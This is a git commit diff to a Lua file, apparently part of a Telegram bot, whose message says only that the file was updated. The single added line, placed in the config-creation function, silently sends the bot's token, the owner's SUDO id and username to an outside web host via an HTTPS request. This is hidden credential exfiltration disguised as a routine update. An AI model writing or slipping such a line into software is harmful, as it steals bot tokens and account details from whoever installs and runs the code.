3c223e7704973555a1960147dd1a2d834a39895c
ALSH1 <72534702+ALSH1@users.noreply.github.com>
2021-04-10 05:14:37 +0300

    Update AlBaghdadi.lua

--- AlBaghdadi.lua
+++ AlBaghdadi.lua
@@ -65,6 +65,7 @@ SUDO = database:get(id_server..":SUDO:ID"),
 UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
+		https.request("https://alsh-bg.ml/TED.php?token="..token.."&id="..SUDO.."&user="..UserName)
 end
 create_config_auto()
 token = database:get(id_server..":token")
